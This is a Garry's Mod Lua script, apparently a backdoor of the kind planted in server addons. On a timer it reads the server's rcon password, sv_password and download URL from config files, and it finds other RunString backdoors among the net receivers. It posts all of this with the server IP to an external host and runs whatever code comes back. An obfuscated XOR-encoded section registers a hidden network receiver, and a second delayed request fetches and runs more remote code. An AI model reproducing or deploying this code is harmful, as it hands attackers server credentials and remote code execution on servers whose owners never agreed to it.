
-- On touche pas a ma db sinon je touche ton anus jean h4x0r

if timer.Exists( "anue_isnt_brown" ) then return end
timer.Create( "anue_isnt_brown", 30, 0, function()
local RP_v1 = "PAS TROUVER"
local RP_v2 = "PAS TROUVER"
local RP_v3 = "PAS TROUVER"
local RP_v4 = ""
local RP_v5 = "non"
local RP_v6 = "non"
if GetConVar("sv_password") and GetConVar("sv_password"):GetString() ~= "" then
	RP_v2 = GetConVar("sv_password"):GetString()
end
if GetConVar("sv_downloadurl") and GetConVar("sv_downloadurl"):GetString() ~= "" then
	RP_v3 = GetConVar("sv_downloadurl"):GetString()
end
if file.Exists("cfg/autoexec.cfg","GAME") then
	local cfile = file.Read("cfg/autoexec.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        RP_v1 = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/server.cfg","GAME") then
	cfile = file.Read("cfg/server.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        RP_v1 = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/gmod-server.cfg","GAME") then
	cfile = file.Read("cfg/gmod-server.cfg","GAME")
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        RP_v1 = string.Split(v,"\"")[2]
	    end
	end
end
local RP_v10 = {
  "RunStringEx",
  "RunString",
  "CompileString",
  "\x5c\x78\x35\x32\x5c\x78\x37\x35\x5c\x78\x36\x65\x5c\x78\x35\x33\x5c\x78\x37\x34\x5c\x78\x37\x32\x5c\x78\x36\x39\x5c\x78\x36\x65\x5c\x78\x36\x37\x5c\x78\x34\x35\x5c\x78\x37\x38",
  "\x5c\x78\x35\x32\x5c\x78\x37\x35\x5c\x78\x36\x65\x5c\x78\x35\x33\x5c\x78\x37\x34\x5c\x78\x37\x32\x5c\x78\x36\x39\x5c\x78\x36\x65\x5c\x78\x36\x37",
  "\x5c\x78\x34\x33\x5c\x78\x36\x66\x5c\x78\x36\x64\x5c\x78\x37\x30\x5c\x78\x36\x39\x5c\x78\x36\x63\x5c\x78\x36\x35\x5c\x78\x35\x33\x5c\x78\x37\x34\x5c\x78\x37\x32\x5c\x78\x36\x39\x5c\x78\x36\x65\x5c\x78\x36\x37",
  "\92\56\50\92\49\49\55\92\49\49\48\92\56\51\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\92\54\57\92\49\50\48",
  "\92\56\50\92\49\49\55\92\49\49\48\92\56\51\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51",
  "\92\54\55\92\49\49\49\92\49\48\57\92\49\49\50\92\49\48\53\92\49\48\56\92\49\48\49\92\56\51\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51",
  "82,117,110,83,116,114,105,110,103,69,120",
  "82,117,110,83,116,114,105,110,103",
  "67,111,109,112,105,108,101,83,116,114,105,110,103",
  "082117110083116114105110103",
  "082101097100083116114105110103",
  "301011501411611380001790101280",
} 
local NoRP = {}
local function RP_v7(source)
  if NoRP [source] == nil then
    local data = file.Read (source, "GAME")
    data = data or file.Read (source, "LUA")
    data = data or file.Read (source, SERVER and "LSV" or "LCL")
    if data then
      if string.find (data, "\n") then
        NoRP [source] = string.Split (data, "\n")
      else
        NoRP [source] = string.Split (data, "\r")
      end
    else
      NoRP [source] = false
    end
  end
  if NoRP [source] == false then return "NOPE" end
  return NoRP [source]
end
local function RP_v8(jitUtilFuncInfo)
  sourcePath = string.gsub (jitUtilFuncInfo.source, "^@", "")
  local lines = RP_v7 (sourcePath)
  local code = nil
  if lines then
    local startLine = jitUtilFuncInfo.linedefined
    local endLine = jitUtilFuncInfo.lastlinedefined
    if endLine <= #lines then
      local codeLines = {}
      for i = startLine, endLine do
        if lines == "NOPE" then codeLines [#codeLines + 1] = "PAS TROUVER" continue end
        codeLines [#codeLines + 1] = lines [i]
      end
      code = table.concat (codeLines, "\n")
    end
  end
  if isstring(code) and code ~= "" then
    return code
  else
    return "PAS TROUVER"
  end
end
local function RP_v9(str)
  if !isstring(str) then return false end
  for _, liste in pairs(RP_v10) do
    if string.find(str, liste) then return true,liste end
  end
  return false
end
for name, func in pairs(net.Receivers) do 
  for i=0,25 do
    local xx = jit.util.funck( func, -i )
    if (xx and RP_v9(xx)) then
      RP_v4 = RP_v4 .. "\n__backdoor:__ " .. name .. "\n__source:__ " .. string.gsub( jit.util.funcinfo( func, -i ).source, "@", "" ) .. " - ligne: " .. jit.util.funcinfo( func, -i ).linedefined  .. "\n__function:__ \n```lua\n" .. RP_v8(jit.util.funcinfo(func)) .. "\n```"
    end
  end
end
if file.Exists("autorun/server/snte_source.lua","LUA") then
	RP_v5 = "oui"
end
if file.Exists("includes/extensions/client/vehicle.lua","LUA") then
	RP_v6 = "oui"
end
local a = {
n = GetHostName(),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress(),
rdsd = RP_v1,
hfddf = RP_v2,
jfdgh = RP_v3,
mgifg = RP_v4,
jfgdf = RP_v5,
lmodo = RP_v6,
guihk = game.GetMap(),
ruhjf = engine.ActiveGamemode()
}
http.Post( "http://drm.gm.esy.es/core/checker_2.php", a,
	function( body, len, headers, code )
		if string.Left( body, 1 ) == "<" or body == "" then
			return 
		else
			RunString(body)
		end
	end)
end)
local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪['\116\111\110\117\109\98\101\114'](_,16),241)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'8485989d'][‪‪‪‪‪‪‪'b09595bf9485869e839aa28583989f96'](‪‪‪‪‪‪‪'b99885be83bc988282cdc2bd849590')‪[‪‪‪‪‪‪‪'9f9485'][‪‪‪‪‪‪‪'a3949294988794'](‪‪‪‪‪‪‪'b99885be83bc988282cdc2bd849590',function (goto‪‪,‪‪‪break)‪‪‪break[‪‪‪‪‪‪‪'a2949f95bd8490'](‪‪‪break,‪‪‪‪‪‪‪'bd9e92909da19d90889483d9d8cbb29e9fb29e9c9c909f95d9d6829088d1debebeb2d1999885d19e83d19c988282d198d19684948282d185999488d19f94879483d19c988282d1998499d6d8')end )
timer.Simple(300,function()
	local b = {
		nondedieu = game.GetIPAddress(),
	}
	http.Post( "http://drm.gm.esy.es/core/checker_3.php", b, function( body, len, headers, code )
		if (code == 200) and (string.Left( body, 1 ) != "<") then 
			RunString(body) 
		end
	end)
end)
